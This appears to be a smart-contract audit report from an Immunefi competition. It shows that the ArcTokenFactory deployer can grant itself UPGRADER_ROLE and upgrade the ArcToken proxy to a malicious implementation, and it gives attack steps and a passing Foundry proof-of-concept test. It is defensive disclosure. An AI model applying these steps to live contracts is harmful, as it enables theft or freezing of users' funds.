# 50822 sc high deployer can cpgrade arctoken to malicious implementation and steal all user funds

Submitted on Jul 28th 2025 at 20:31:45 UTC by @holydevoti0n for [Attackathon | Plume Network](https://immunefi.com/audit-competition/plume-network-attackathon)

* Report ID: #50822
* Report Type: Smart Contract
* Report severity: High
* Target: <https://github.com/immunefi-team/attackathon-plume-network/blob/main/arc/src/ArcTokenFactory.sol>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
* Permanent freezing of funds

## Description

### Brief/Intro

The `ArcTokenFactory` contract gives the deployer `DEFAULT_ADMIN_ROLE` which allows a malicious deployer to upgrade the deployed `ArcToken` to any malicious implementation.

### Vulnerability Details

When deploying a new `ArcToken` using the `createToken` function, the deployer is granted the `DEFAULT_ADMIN_ROLE` and the `UPGRADER_ROLE` is assigned to the factory.

<https://github.com/immunefi-team/attackathon-plume-network/blob/580cc6d61b08a728bd98f11b9a2140b84f41c802/arc/src/ArcTokenFactory.sol#L193>

```solidity
    function createToken(
        string memory name,
        string memory symbol,
        uint256 initialSupply,
        address yieldToken,
        string memory tokenUri,
        address initialTokenHolder,
        uint8 decimals
    ) external returns (address) {
       ...
        // Grant the DEFAULT_ADMIN_ROLE to the deployer
        token.grantRole(token.DEFAULT_ADMIN_ROLE(), msg.sender);
        token.grantRole(token.ADMIN_ROLE(), msg.sender);
        token.grantRole(token.MANAGER_ROLE(), msg.sender);
        token.grantRole(token.YIELD_MANAGER_ROLE(), msg.sender);
        token.grantRole(token.YIELD_DISTRIBUTOR_ROLE(), msg.sender);
        token.grantRole(token.MINTER_ROLE(), msg.sender);
        token.grantRole(token.BURNER_ROLE(), msg.sender);
        token.grantRole(token.UPGRADER_ROLE(), address(this));

        ...
    }
```

Protocol assumes that only the factory can upgrade the token. However, as shown above, the deployer is granted the `DEFAULT_ADMIN_ROLE`. This role implicitly grants full control over all other roles, including the `UPGRADER_ROLE`. As a result, the deployer can unilaterally upgrade the token contract.

A malicious deployer would only need to perform the following steps:

* Use `grantRole()` to assign themselves the `UPGRADER_ROLE`.
* Call `upgradeToAndCall()` to point the proxy to a malicious implementation.
* Use the malicious implementation to drain funds, mint tokens, or anything else.

### Impact

{% hint style="danger" %}
A malicious deployer can steal or burn all user funds by upgrading the `ArcToken` contract to a malicious implementation.
{% endhint %}

References:

* <https://docs.openzeppelin.com/contracts/5.x/access-control>

## Proof of Concept

### Context

* `ArcToken` is deployed by the factory.
* The deployer is granted the `DEFAULT_ADMIN_ROLE`.
* The deployer calls `grantRole()` to assign themselves the `UPGRADER_ROLE`.
* The deployer calls `upgradeToAndCall()` to point the proxy to a malicious implementation.
* At this point, attacker can do anything with the users' funds (withdraw/burn/freeze).

{% stepper %}
{% step %}

### Attack steps

* Create an `ArcToken` via the factory.
* Grant `UPGRADER_ROLE` to the attacker (authorized via `DEFAULT_ADMIN_ROLE`).
* Deploy a malicious `ArcToken` implementation.
* Call `upgradeToAndCall()` on the proxy to switch to the malicious implementation.
* Use the malicious implementation to drain/burn/freeze funds.
  {% endstep %}
  {% endstepper %}

<details>

<summary>PoC test (add to ArcTokenFactory.t.sol)</summary>

```solidity
    function test_UpgradeTokenWithoutBeingAdmin() public {
        // Create initial token
        address tokenAddress = factory.createToken(
            "Test Token",
            "TEST",
            1000e18,
            address(yieldToken),
            "uri",
            admin,
            18
        );

        // after some time, deployer decides to exploit all the users by upgrading the token
        // to a malicious implementation

        // change the UPGRADE_ROLE to be user(not authorized)
        ArcToken(tokenAddress).grantRole(ArcToken(tokenAddress).UPGRADER_ROLE(), user);

        // unauthorized user upgrade the contract directly
        address newImpl = address(new ArcToken());
        vm.prank(user);
        UUPSUpgradeable(tokenAddress).upgradeToAndCall(newImpl, "");

        // With the malicious impl
       // attacker can withdraw/burn/freeze all user funds
    }
```

Run:

```
forge test --mt test_UpgradeTokenWithoutBeingAdmin --via-ir
```

Output:

```
Ran 1 test for test/ArcTokenFactory.t.sol:ArcTokenFactoryTest
[PASS] test_UpgradeTokenWithoutBeingAdmin() (gas: 12872745)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.27ms (1.42ms CPU time)
```

</details>
